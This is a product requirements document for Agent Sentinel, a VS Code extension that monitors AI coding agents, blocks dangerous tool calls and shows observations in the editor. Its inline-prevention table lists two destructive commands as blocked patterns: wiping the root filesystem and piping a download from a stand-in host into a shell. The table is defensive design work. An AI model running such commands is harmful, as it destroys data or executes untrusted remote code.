# Agent Sentinel Extension — Vision & Product Requirements

> **Status**: Approved — Ideation Complete
> **Date**: 2026-03-25
> **Scope**: VS Code extension (primary) and cross-IDE client architecture
> **Related**: [Tiered Evaluation Model](https://github.com/VolitionLabsAi/agent-sentinel/blob/main/docs/architecture/tiered-evaluation-model.md) · [Daemon Model Analysis](https://github.com/VolitionLabsAi/agent-sentinel/blob/main/docs/architecture/daemon-model-analysis.md)

---

## Table of Contents

- [1. Product Vision](#1-product-vision)
  - [1.1 Positioning](#11-positioning)
  - [1.2 Zero to Value in 30 Seconds](#12-zero-to-value-in-30-seconds)
  - [1.3 Adoption Flywheel](#13-adoption-flywheel)
- [2. The Experience — Multi-Surface Presence](#2-the-experience--multi-surface-presence)
  - [2.1 Status Bar Pulse](#21-status-bar-pulse)
  - [2.2 Activity Bar Panel](#22-activity-bar-panel)
  - [2.3 Observation Cards](#23-observation-cards)
  - [2.4 Sentinel Conversation Access](#24-sentinel-conversation-access)
  - [2.5 Guided Setup Walkthrough](#25-guided-setup-walkthrough)
  - [2.6 Repo Health Assessment](#26-repo-health-assessment)
- [3. Multi-Session Support](#3-multi-session-support)
  - [3.1 View Modes](#31-view-modes)
  - [3.2 Session Correlation — Prototype Findings](#32-session-correlation--prototype-findings)
  - [3.3 Clickable Observation Navigation](#33-clickable-observation-navigation)
- [4. Real-Time Observation Display](#4-real-time-observation-display)
- [5. Inline Prevention — Static Analysis / Tier 0](#5-inline-prevention--static-analysis--tier-0)
- [6. Rapid Eval Creation](#6-rapid-eval-creation)
- [7. Dynamic Eval Story](#7-dynamic-eval-story)
  - [7.1 Community Eval Sharing](#71-community-eval-sharing)
- [8. Cross-Harness Support](#8-cross-harness-support)
  - [8.1 Harness Adapter Architecture](#81-harness-adapter-architecture)
  - [8.2 Harness-Per-Sentinel Configuration (Three-Tier Override Model)](#82-harness-per-sentinel-configuration-three-tier-override-model)
- [9. Cross-IDE Architecture](#9-cross-ide-architecture)
  - [9.1 Core Service + Thin Client Model](#91-core-service--thin-client-model)
  - [9.2 IDE Target Priority](#92-ide-target-priority)
- [10. OSS / Commercial Split](#10-oss--commercial-split)
  - [10.1 Two Extensions, Same Publisher](#101-two-extensions-same-publisher)
  - [10.2 The Boundary Principle](#102-the-boundary-principle)
  - [10.3 Cost Model](#103-cost-model)
- [11. Competitive Landscape](#11-competitive-landscape)
- [12. Accessibility](#12-accessibility)
- [13. Performance Budget](#13-performance-budget)
- [14. Telemetry and Privacy](#14-telemetry-and-privacy)
- [15. Repo Structure](#15-repo-structure)
- [16. Phase Overview](#16-phase-overview)
- [17. Key Decisions](#17-key-decisions)
- [18. Open Questions](#18-open-questions)

---

## 1. Product Vision

### 1.1 Positioning

**"Error Lens + GitLens for AI agent safety."**

Agent-sentinel-extension makes AI agent monitoring viscerally present, beautifully rendered, and impossible to ignore. It takes something that exists today only as hidden infrastructure — agent monitoring — and makes it a first-class developer experience.

The best VS Code extensions don't feel like plugins — they feel like the editor was always supposed to work that way. That is the bar.

### 1.2 Zero to Value in 30 Seconds

Install the extension. It detects sentinel configuration in your workspace. A status bar item appears. Your next agent conversation triggers an evaluation. Within seconds, you see your first observation — not buried in a log, not in a hidden panel, but *right there*. No configuration required.

### 1.3 Adoption Flywheel

1. Developer installs the free extension because it is useful and beautiful.
2. They see sentinel catching real issues in their agent sessions.
3. They tell their team — *"you need to see what this caught."*
4. Team adopts organically, bottom-up.
5. Enterprise needs emerge: policy, audit trails, fleet visibility.
6. The commercial extension captures that value.

---

## 2. The Experience — Multi-Surface Presence

### 2.1 Status Bar Pulse

A persistent heartbeat in the VS Code status bar:

- **Green** when clear, **amber** on warnings, **red** on criticals.
- Shows last evaluation time and a tiny sparkline of recent activity.
- Click to cycle visibility modes: `auto → show → hide`.
- The "always on" surface — even users who never open the panel know sentinel is watching.

### 2.2 Activity Bar Panel

The sentinel icon in the activity bar opens three dedicated views:

#### 2.2.1 Live Feed

Observations streaming in real-time, severity-colored, with eval ID, one-liner summary, and expandable analysis. Like a security operations center rendered as a tree view.

#### 2.2.2 Session Health

Current session vital signs displayed in a webview with charts:

- Evaluation count, failure rate, dynamic rules created, timing trends.
- Sparklines for evaluation latency.
- Severity distribution donut chart.
- Observation timeline mapped to conversation turns.

#### 2.2.3 Eval Rules

Every active rule across all domains (`GEN`, `SEC`, `LOCAL`):

- Enable/disable toggles per rule.
- Hit counts and last-triggered timestamps.
- Inspection view for rule definition and rationale.
- Dynamic rules (`LOCAL-xxx`) highlighted as **"learned this session"** with their creation rationale.

### 2.3 Observation Cards

`CRITICAL` and `WARNING` observations are rendered as rich webview cards:

- Severity badge (color-coded).
- Eval ID linked to documentation.
- One-liner as headline, analysis as body text.
- Timestamp and originating sentinel (`GEN` / `SEC`).

These must feel like the output of a serious security tool — not a tooltip.

### 2.4 Sentinel Conversation Access

Users can open the sentinel's sidechain session as an editor tab to talk directly to their sentinel. Sentinel sessions are hidden from Claude Code's session picker by design; the extension provides the doorway.

**Mechanism**: "Open Sentinel Chat" invokes `claude-vscode.editor.open` with the sentinel's session ID read from `sentinel-state.json`.

Users can steer the sentinel mid-session:

> *"Hey Sentinel, this is the third time I've seen this happen. The agent keeps forgetting this design choice. Can you reinforce this for the remainder of the session?"*

The sentinel can respond by creating dynamic evals or adjusting its monitoring focus.

**Cross-harness requirement**: When multiple harnesses are configured, the sentinel conversation must open in the correct harness's editor tab (see [Section 8](#8-cross-harness-support)).

### 2.5 Guided Setup Walkthrough

First-time users get interactive onboarding:

- What sentinel does and why it matters.
- How to read observations and severity levels.
- How to customize rules and create new evals.

Built with VS Code's **Walkthrough API** using `onContext:` completion events tied to file existence checks (e.g., sentinel config present, first eval triggered, first observation viewed).

### 2.6 Repo Health Assessment

The extension continuously assesses workspace health and surfaces issues without nagging.

**Health States**:

| State | Status Bar | Meaning |
|-------|-----------|---------|
| Not Initialized | Grey | No sentinel configuration detected |
| Initialized / Idle | Blue | Configured but no active session |
| Running | Green | Sentinel actively monitoring |
| Degraded | Amber | Partial functionality (e.g., missing skills) |
| Error | Red | Sentinel cannot operate |

**Health Checks**:
- Configuration file presence and validity.
- Eval definition files loadable.
- Skills directory populated.
- Agent definitions present.
- Hook registration intact.
- CLI binary (`agent-sentinel`) on `PATH`.

**Design Principle**: Detect, don't nag. The status bar is always visible and color-coded. Notifications fire at most once per issue per session.

---

## 3. Multi-Session Support

The extension must handle 10+ concurrent Claude Code sessions natively. This is not an edge case — it is a primary use case (e.g., left/right editor tab groups with multiple sessions each).

### 3.1 View Modes

| Mode | Behavior | Use Case |
|------|----------|----------|
| **All Sessions** | Dashboard showing every monitored session with summary health | The "SOC view" — fleet-level awareness |
| **Active Session** | Auto-filtered to whichever Claude Code tab is focused | Default mode — context follows focus |
| **Pinned Session** | Manually pin a specific session; stays visible regardless of tab focus | Deep-dive into a specific session |

### 3.2 Session Correlation — Prototype Findings

A working prototype was built and tested. Key findings:

**What works**:
- Tab detection via `tabGroups.onDidChangeTabs` + filtering for `viewType.includes('claudeVSCodePanel')` reliably detects Claude Code editor tabs.
- Session navigation via `claude-vscode.editor.open(sessionId)` works perfectly — opens new tabs for unknown sessions, activates existing tabs for already-open sessions.

**The gap**:
- `TabInputWebview` exposes only a `viewType` property — **no session ID**.
- Tab `label` shows the session title but is truncated and can be stale (renamed behind the scenes but tab not yet reloaded).
- Title-based matching is unreliable for correlation.

**Probable solutions** (to be validated in architecture):
- Correlating via transcript file write timestamps.
- Claude Code lock files at `.claude/ide/*.lock`.
- Sentinel state file (`sentinel-state.json`) transcript paths.

**Known limitation**: The sidebar Claude Code panel is NOT detected by `tabGroups` — only editor tabs are visible to the extension.

### 3.3 Clickable Observation Navigation

Every observation in the Live Feed and observation cards is clickable. Clicking navigates to the Claude Code session where the observation was raised, using `claude-vscode.editor.open(sessionId)`. This is proven functional from prototype testing.

---

## 4. Real-Time Observation Display

The extension is the **fast path** for observations. Today, observations travel through XML relay:

```
TODAY (slow, lossy):
  Trigger → Evaluate → XML Relay → Agent reproduces in visible response → User sees

EXTENSION (fast):
  Trigger → Evaluate → Extension shows immediately
```

With the extension, observations appear the moment they are written to disk — before the agent even receives the `decision:block` response. The XML relay becomes a fallback for users without the extension installed.

### How It Works

Observations are persisted as structured JSON files by the core sentinel process. The extension uses VS Code's `FileSystemWatcher` API to monitor the observation output directory for new and changed files. When a new observation file is written, the watcher fires an event and the extension parses, validates, and renders the observation immediately.

**File format**: Each observation is a JSON file containing the severity, eval ID, one-liner, analysis, timestamp, originating sentinel, and session metadata. JSON is chosen over alternatives (YAML, binary) for parse speed, native TypeScript support, and debuggability.

**Expected latency**: The XML relay path involves multiple hops — the sentinel writes its evaluation, the result is relayed via XML tags back through the agent's conversation, and the agent reproduces it in its visible response. This adds 2–10+ seconds of latency depending on agent response length and model speed. The file-watcher path eliminates all intermediate hops: `FileSystemWatcher` events typically fire within 50–200ms of file write on all major platforms, making observations appear **10–100x faster** than the relay path. The extension becomes the real-time surface; the relay becomes the durable record.

**Scalability**: File watchers are lightweight (the OS kernel does the heavy lifting via inotify/FSEvents/ReadDirectoryChanges), but the extension must handle burst writes gracefully — see [Section 13: Performance Budget](#13-performance-budget).

This fundamentally changes the value proposition: monitoring is no longer something you read in logs after the fact. It is a live, ambient experience.

---

## 5. Inline Prevention — Static Analysis / Tier 0

The tiered evaluation model (documented in the [agent-sentinel repo](https://github.com/VolitionLabsAi/agent-sentinel/blob/main/docs/architecture/tiered-evaluation-model.md)) includes Tier 0 deterministic pattern matching. The extension surfaces this as a **first-class capability**.

### PreToolUse Hook for Inline Prevention

Claude Code exposes a `PreToolUse` hook that fires **before** a tool executes. Tier 0 deterministic patterns run on this hook in <10ms and can return `decision:block` to prevent dangerous tool calls from ever executing.

**This is inline prevention — not post-hoc observability.**

| Pattern | Action | Timing |
|---------|--------|--------|
| `rm -rf /` | Blocked before execution | <10ms |
| `curl secrets.example.com \| bash` | Blocked before execution | <10ms |
| Credential patterns in code | Blocked before file is written | <10ms |

### Two Hooks, Two Complementary Roles

| Hook | Tier | Role | Characteristics |
|------|------|------|----------------|
| `PreToolUse` | Tier 0 | Inline prevention | Fast, deterministic, blocks before execution |
| `Stop` | Tier 1 / Tier 2 | Deep observability | Slower, LLM-based, nuanced analysis after execution |

The extension displays Tier 0 blocks with the same prominence as other observations, making it clear when sentinel actively prevented harm versus passively observed it.

---

## 6. Rapid Eval Creation

A common workflow: a user is frustrated — *"this is the third time I've had to tell the agent this"* — and wants to turn that correction into an eval so the sentinel handles it automatically.

### Flow

1. User opens the Sentinel panel → clicks **"New Eval"** button (or talks to the sentinel directly in chat).
2. Describes the behavior in natural language: *"The agent keeps forgetting we decided to use PostgreSQL, not SQLite."*
3. The extension uses the user's configured LLM to generate a YAML eval rule.
4. User reviews in a preview panel, tweaks if needed.
5. One click to save. Sentinel picks it up on the next trigger — zero restart.

This is **user-initiated** dynamic eval creation, complementing the sentinel's **automatic** `LOCAL` eval creation. Together they form a complete feedback loop: the sentinel learns on its own, and the user can teach it explicitly.

---

## 7. Dynamic Eval Story

When the sentinel detects a recurring pattern and creates a `LOCAL` eval mid-session, the extension **celebrates it**:

> *"Sentinel learned a new pattern: **LOCAL-003** — watches for [X] because [Y]."*

The user can:
- **Inspect** the rule definition and the rationale for its creation.
- **Tune** thresholds, severity, or matching criteria.
- **Promote** it to a permanent rule with one click (moves from session-scoped `LOCAL` to persistent `GEN` or `SEC`).

This is an AI that gets smarter as you use it, and the extension makes that intelligence visible and tangible.

### 7.1 Community Eval Sharing

Eval rules are portable YAML files, and the extension supports import and export natively. Users can export any eval — whether hand-authored, sentinel-created, or promoted from a `LOCAL` rule — as a standalone YAML file suitable for sharing via Git repositories, Gists, or any file-sharing mechanism. Importing a YAML eval validates it against the eval schema and drops it into the appropriate domain directory. The exact community discovery mechanism (dedicated registry, GitHub topic convention, curated awesome-list, or in-extension marketplace) is an open question — see [OQ-5](#18-open-questions). The goal is to make sharing as frictionless as copying a file, with richer discovery infrastructure layered on in Phase 6.

---

## 8. Cross-Harness Support

Agent-sentinel is **not** Claude Code-specific. It is designed to work with multiple AI coding agent harnesses.

### 8.1 Harness Adapter Architecture

```
┌──────────────────────────────────────────┐
│     Extension Core                        │
│     (UI, state management, eval mgmt)     │
└──────────────────┬───────────────────────┘
                   │
         Harness Adapter Interface
                   │
┌──────────┬───────────┬───────────┬───────────┐
│  Claude  │   Codex   │  Copilot  │  Gemini   │
│  Code    │           │           │   CLI     │
└──────────┴───────────┴───────────┴───────────┘
```

Each adapter implements a common interface to:

- **Detect** active sessions for its harness.
- **Hook** into the evaluation trigger mechanism.
- **Inject** observations back into the conversation (harness-specific relay).
- **Navigate** to specific turns/sessions in the IDE.
- **Open** the sentinel's conversation in the correct harness's editor.

### 8.2 Harness-Per-Sentinel Configuration (Three-Tier Override Model)

Sentinel harness and model selection follows a three-tier override model. Resolution order: **Tier 3 > Tier 2 > Tier 1** (most specific wins).

#### Tier 1 — Match the Observed Agent (Default)

No configuration needed. The sentinel uses the same harness and model as the agent it monitors.

- Sentinel monitoring a Claude Code session → runs as Claude Code sentinel.
- Sentinel monitoring a Codex session → runs as Codex sentinel.

#### Tier 2 — Match the Harness, Override the Model

The user keeps default harness matching but specifies which model to use per harness:

| Observed Agent | Sentinel Harness | Sentinel Model |
|---------------|-----------------|----------------|
| Claude Code | Claude Code | `claude-haiku-4-5` (cheap) |
| Codex | Codex | `gpt-4.1-mini` (cheap) |
| Gemini CLI | Gemini CLI | `gemini-2.0-flash` (cheap) |

Use case: cost optimization — use cheaper models for monitoring while agents run on frontier models.

#### Tier 3 — Bulk Override (Full Control)

A single harness + model for ALL sentinels regardless of the observed agent:

- Always use Claude Code with `claude-haiku-4-5`, even when monitoring Codex.
- Or always use a local `llama-server` endpoint.
- Supports fine-tuned sentinel-specific models.

Use case: standardization, local/offline operation, or using a model specifically fine-tuned for sentinel evaluation.

**Discoverability requirement**: These settings must be accessible in the extension settings UI with clear descriptions, not buried in JSON configuration files.

---

## 9. Cross-IDE Architecture

### 9.1 Core Service + Thin Client Model

The extension is the first client, but the architecture must support multiple IDEs from the start.

```
┌──────────────────────────────────────────────┐
│  Core Monitoring Service (Go binary)          │
│  ┌────────────────────────────────────────┐   │
│  │ Evaluation engine                      │   │
│  │ State management                       │   │
│  │ Observation persistence                │   │
│  │ Harness adapters                       │   │
│  │ Chat / eval creation logic             │   │
│  └────────────────────────────────────────┘   │
└──────────────────┬───────────────────────────┘
                   │  JSON-RPC / stdio / HTTP
┌──────────────────┴───────────────────────────┐
│  Thin IDE Clients                             │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ VS Code  │  │JetBrains │  │  Neovim  │    │
│  │(TypeScript)│ │ (Kotlin) │  │  (Lua)   │    │
│  └──────────┘  └──────────┘  └──────────┘    │
└──────────────────────────────────────────────┘
```

Each IDE client is a thin presentation layer. All monitoring logic, evaluation, state management, and persistence lives in the core Go binary — the same binary that powers the CLI.

### 9.2 IDE Target Priority

| Priority | Target | Coverage | Notes |
|----------|--------|----------|-------|
| 1 | VS Code + forks (Cursor, Windsurf, VSCodium, Theia) | ~85% | One extension, dual-published to Microsoft Marketplace + Open VSX |
| 2 | JetBrains IDEs | Enterprise Java/Go | New thin client in Kotlin, same core service |
| 3 | Terminal / CLI | Headless agents | Direct service interaction, no IDE required |
| 4 | Neovim | ~14% niche | Thin Lua client |
| 5 | Web / Browser | Codespaces, github.dev | Web extension variant |

---

## 10. OSS / Commercial Split

### 10.1 Two Extensions, Same Publisher

#### agent-sentinel-extension (OSS, Apache 2.0)

Everything an individual developer needs:

- Real-time monitoring and observation display (full status bar, activity panel, live feed).
- Built-in eval rules across all domains (`GEN` + `SEC`).
- Session-scoped dynamic evals (sentinel-created `LOCAL` rules).
- Tier 0 + Tier 1 + Tier 2 evaluation — **the eval engine is fully open source**.
- Local per-repo configuration.
- Community eval rule sharing (import/export YAML).
- Session summary and basic reporting.
- Sentinel conversation access.
- Rapid eval creation.
- Typed extension API that the commercial extension consumes.

#### volition-extension (Commercial, extends agent-sentinel-extension)

Everything an organization needs at scale:

- `extensionDependencies: ["volition.agent-sentinel"]`
- **Fleet dashboard** — aggregate view of all agents across the org.
- **Policy-as-code** — centralized eval policies pushed to all workstations.
- **Custom eval authoring** with testing and validation tooling.
- **Audit trail and compliance reporting** — SOC 2 evidence collection.
- **Alerting and escalation** — Slack, PagerDuty, email integrations.
- **Cross-session analytics** — behavior patterns, drift detection.
- **Approval workflows** — human-in-the-loop gates for high-risk actions.
- **SSO/SAML, RBAC** — enterprise identity and access control.
- **Data residency guarantees** and self-hosted option for air-gapped environments.

### 10.2 The Boundary Principle

**Individual value is free. Organizational value is paid.**

This boundary is proven by the GitLens model: 40M installs, $10.6M revenue, bootstrapped. The OSS extension is genuinely complete for individual use — it is not a crippled trial.

### 10.3 Cost Model

| Tier | Hosting Cost | Inference Cost | Revenue |
|------|-------------|---------------|---------|
| **Free** | Zero. Pure client-side extension. | User's own API keys or subscriptions. | — |
| **Enterprise** | Zero inference hosting. | Same — local/user-provided. | Per-seat subscription, $15–25/seat/month |
| **Premium add-ons** (future) | Centralized infrastructure. | Hosted inference for aggregation features. | Usage-based |

We distribute code, not compute. Enterprise pays for orchestration, policy management, fleet dashboard, audit trails, and compliance tooling — the connective tissue.

---

## 11. Competitive Landscape

The AI safety market ($227M → $4.8B projected, 35–45% CAGR) is consolidating rapidly through acquisitions:

| Acquired | Acquirer |
|----------|----------|
| Lakera | Check Point |
| Protect AI | Palo Alto Networks |
| Prompt Security | SentinelOne |
| AIM Security | Cato Networks |
| Pangea | CrowdStrike |

**Every one of them operates at the API/runtime layer.** Nobody is monitoring AI agents at the IDE level in real-time.

Agent-sentinel-extension occupies a **category of one**: real-time, in-editor AI agent safety monitoring. The closest analogues are developer experience tools (Error Lens, GitLens), not security platforms — which is exactly the wedge.

---

## 12. Accessibility

All webview components (observation cards, session health dashboard, eval rule inspector) must meet **WCAG 2.1 AA** compliance:

- **Color contrast**: All severity indicators, status colors, and text must meet minimum contrast ratios (4.5:1 for normal text, 3:1 for large text). Severity must never be communicated by color alone — pair with icons, labels, or patterns.
- **Keyboard navigation**: Every interactive element in webviews must be reachable and operable via keyboard. Focus order must be logical. Focus indicators must be visible.
- **Screen reader support**: Observation cards, tree views, and status bar items must expose appropriate ARIA roles and labels. Live feed updates should use ARIA live regions so screen readers announce new observations.
- **High-contrast themes**: The extension must fully support VS Code's built-in high-contrast themes (High Contrast and High Contrast Light). All custom UI must respond to `--vscode-*` CSS variables and never hard-code colors.
- **Reduced motion**: Animations (sparklines, pulse effects, transitions) must respect the `prefers-reduced-motion` media query and the VS Code `workbench.reduceMotion` setting.

Accessibility is not a Phase 6 polish item — it is a requirement from Phase 1 onward.

---

## 13. Performance Budget

The extension must remain imperceptible to the user's workflow. Concrete targets:

- **Activation time**: The extension must activate in under **200ms**. Use VS Code's lazy activation events (`onStartupFinished`, `workspaceContains:**/sentinel-config.*`) to avoid blocking editor startup. Heavy initialization (file watcher setup, state hydration) should be deferred until after activation completes.
- **Memory footprint**: Baseline memory usage must stay under **50MB** with 10+ actively monitored sessions. Observation history should be bounded — older observations evicted from in-memory caches and served from disk on demand.
- **File watcher scalability**: One `FileSystemWatcher` per monitored session's observation directory. With 10+ sessions, this means 10+ active watchers. The extension must coalesce rapid-fire events (debounce/throttle) to avoid UI thrashing during burst evaluation periods.
- **Webview rendering**: Session health charts and observation cards must render within **100ms**. Virtualized/windowed rendering for long observation lists to prevent DOM bloat.
- **CPU during idle**: Near-zero CPU usage when no evaluations are running. File watchers are OS-level and do not consume CPU while waiting.

Performance budgets should be validated with automated benchmarks in CI. Regression beyond these thresholds blocks release.

---

## 14. Telemetry and Privacy

**The OSS extension collects no telemetry by default.** This is a deliberate trust decision.

- **No phone-home**: The extension makes zero network requests. All data stays on the user's machine. There is no analytics endpoint, no crash reporting service, no usage beacon.
- **No observation exfiltration**: Observations, eval rules, session transcripts, and sentinel state files are never transmitted anywhere. The extension reads local files and renders them locally.
- **Optional anonymous usage analytics**: If usage analytics are introduced in the future, they must be strictly **opt-in** (not opt-out), clearly scoped (e.g., feature activation counts, never content), and documented in the extension's privacy policy. The opt-in prompt must explain exactly what is collected and where it is sent.
- **Commercial extension telemetry**: The commercial `volition-extension` may include telemetry for fleet management features (aggregate eval counts, policy compliance rates). This telemetry is governed by the enterprise customer's data agreement and is never enabled without explicit organizational consent.
- **Audit transparency**: If any telemetry is ever added to either extension, the collection code must be clearly marked in the source, auditable by the community, and removable by fork maintainers.

This policy is critical for OSS trust and enterprise adoption in security-sensitive environments.

---

## 15. Repo Structure

| Layer | OSS Repository | Commercial Repository |
|-------|---------------|----------------------|
| CLI | `agent-sentinel` | `volition-cli` |
| Extension | `agent-sentinel-extension` | `volition-extension` |

**CLI architecture**: Monolith Go binary per industry standard (Vault/Terraform pattern). `agent-sentinel` is an importable library; `volition-cli` wraps it with commercial features.

**Planning document migration**: Planning documents currently live in `agent-sentinel` at `docs/extension/` because the extension repository does not exist yet. These documents must be migrated to `agent-sentinel-extension` when that repository is created in Phase 1.

---

## 16. Phase Overview

Detailed phasing, timelines, and effort estimates are maintained in a separate document. For context and cross-reference:

| Phase | Name | Summary |
|-------|------|---------|
| 0 | Sentinel Foundation | CLI changes required before the extension can be built |
| 1 | Extension Scaffold + Core | The "install and say wow" moment — status bar, live feed, basic observation display |
| 2 | Rich Dashboard + Eval Management | Session health webview, eval rules panel, charts |
| 3 | Sentinel Interaction | Conversable sentinel, rapid eval creation, dynamic eval promotion |
| 4 | Cross-Harness Support | Codex, Copilot, Gemini CLI adapters |
| 5 | Extension API + Commercial Foundation | Typed API surface, volition-extension scaffold |
| 6 | Polish + Marketplace | Documentation site, community eval sharing, marketplace optimization |

---

## 17. Key Decisions

Decisions that are **locked** — rationale included for future reference.

| # | Decision | Rationale |
|---|----------|-----------|
| KD-1 | **Apache 2.0 for OSS extension** | Maximizes adoption; permissive license is standard for VS Code extensions. Compatible with commercial extension overlay. |
| KD-2 | **Extension reads observation files directly (fast path)** | Eliminates the XML relay latency. Observations appear the instant they are written, before the agent receives the decision response. |
| KD-3 | **PreToolUse hook for Tier 0 inline prevention** | Claude Code's PreToolUse fires before tool execution. Tier 0 deterministic patterns run in <10ms and can block dangerous operations. This is genuine prevention, not just detection. |
| KD-4 | **Two hooks, two roles: PreToolUse (prevent) + Stop (observe)** | Clean separation of concerns. Fast deterministic blocking on PreToolUse; slow nuanced LLM analysis on Stop. |
| KD-5 | **Three-tier harness configuration model** | Covers the full spectrum from zero-config (Tier 1) to full control (Tier 3) without complexity for users who don't need it. |
| KD-6 | **Core Go binary + thin IDE clients** | Keeps monitoring logic in one place. IDE clients are pure presentation. Enables multi-IDE support without duplicating the evaluation engine. |
| KD-7 | **VS Code first, dual-publish to Marketplace + Open VSX** | ~85% developer coverage from a single extension. Covers Cursor, Windsurf, VSCodium, Theia. |
| KD-8 | **OSS/commercial boundary: individual free, organizational paid** | Proven by GitLens. The OSS extension is genuinely complete — not a crippled trial. Commercial extension adds fleet/policy/compliance capabilities via `extensionDependencies`. |
| KD-9 | **Zero hosting cost for free tier** | All inference runs on user's machine. We distribute code, not compute. No infrastructure cost scales with adoption. |
| KD-10 | **Sentinel conversation access via `claude-vscode.editor.open`** | Proven in prototype. Session ID from `sentinel-state.json` opens the sentinel's hidden sidechain session as an editor tab. |
| KD-11 | **Planning docs live in `agent-sentinel` until extension repo exists** | Pragmatic — the extension repo is created in Phase 1. Docs migrate at that point. |
| KD-12 | **Walkthrough API for onboarding** | VS Code's native walkthrough system with `onContext:` completion events provides guided, step-by-step onboarding without custom UI. |

---

## 18. Open Questions

Issues identified during ideation that require further investigation or architecture-level decisions.

| # | Question | Context | Likely Resolution Path |
|---|----------|---------|----------------------|
| OQ-1 | **How to reliably correlate VS Code tabs to sentinel sessions?** | `TabInputWebview` exposes only `viewType` — no session ID. Title-based matching is unreliable. | Investigate transcript file write timestamps, `.claude/ide/*.lock` files, and sentinel state file transcript paths. Prototype each approach. |
| OQ-2 | **How to detect the sidebar Claude Code panel?** | `tabGroups` API only sees editor tabs, not the sidebar panel. | Research VS Code sidebar view detection APIs or alternative signals (process list, file watchers). |
| OQ-3 | **What is the JSON-RPC / stdio / HTTP protocol between core service and IDE clients?** | Architecture doc scope — but the choice affects latency, complexity, and cross-platform support. | Evaluate during Phase 0/1 architecture design. JSON-RPC over stdio is the LSP-proven pattern. |
| OQ-4 | **How do non-Claude-Code harnesses expose hooks?** | PreToolUse/Stop hooks are Claude Code concepts. Codex, Copilot, and Gemini CLI may have different or no hook mechanisms. | Research each harness's extensibility model during Phase 4 planning. May require polling or file-watching fallbacks. |
| OQ-5 | **What is the eval rule sharing format for community exchange?** | YAML import/export is decided, but the schema, versioning, and discovery mechanism (registry? GitHub topic?) are undefined. | Define schema in Phase 2; community infrastructure in Phase 6. |
| OQ-6 | **How does the extension handle multiple workspaces with different sentinel configurations?** | VS Code multi-root workspaces can have independent sentinel setups. | Likely: per-workspace-folder configuration with a merged view in the panel. Design during Phase 1. |
| OQ-7 | **What is the extension API surface for volition-extension?** | The OSS extension must expose a typed API. The shape of this API determines what the commercial extension can build on. | Define during Phase 5, informed by Phase 1–4 experience. |
| OQ-8 | **How to handle observation display when the extension is installed but sentinel is not running?** | The extension should degrade gracefully — show historical observations, offer to start sentinel, or explain prerequisites. | Design during Phase 1 as part of the health assessment system. |
| OQ-9 | **Extension activation performance budget — what are the memory/CPU thresholds for 10+ sessions?** | With 10+ concurrent sessions, each with its own file watcher and observation history, resource consumption could become significant. Need concrete thresholds and a measurement/enforcement strategy. | Benchmark during Phase 1 with synthetic multi-session loads. Establish CI-enforced budgets (see [Section 13](#13-performance-budget)). |
| OQ-10 | **Telemetry policy for the OSS extension — anonymous usage data, opt-in vs opt-out?** | The current policy is no telemetry. If usage analytics are ever desired (to guide feature prioritization), the opt-in vs opt-out decision has significant trust implications for an OSS security tool. | Defer until post-launch. If introduced, must be opt-in with full transparency (see [Section 14](#14-telemetry-and-privacy)). |
| OQ-11 | **How to handle very large observation histories?** | Long-running sessions can produce thousands of observations. Rendering all of them in the Live Feed or observation cards will degrade performance and UX. | Investigate virtualized/windowed list rendering, pagination with "load more" semantics, and automatic archival of older observations to disk with on-demand retrieval. Design during Phase 2. |

---

*This document captures the complete vision and product requirements as agreed during the ideation session. It is the authoritative reference for what agent-sentinel-extension will be. Architecture decisions, implementation details, and timelines are maintained in separate documents.*
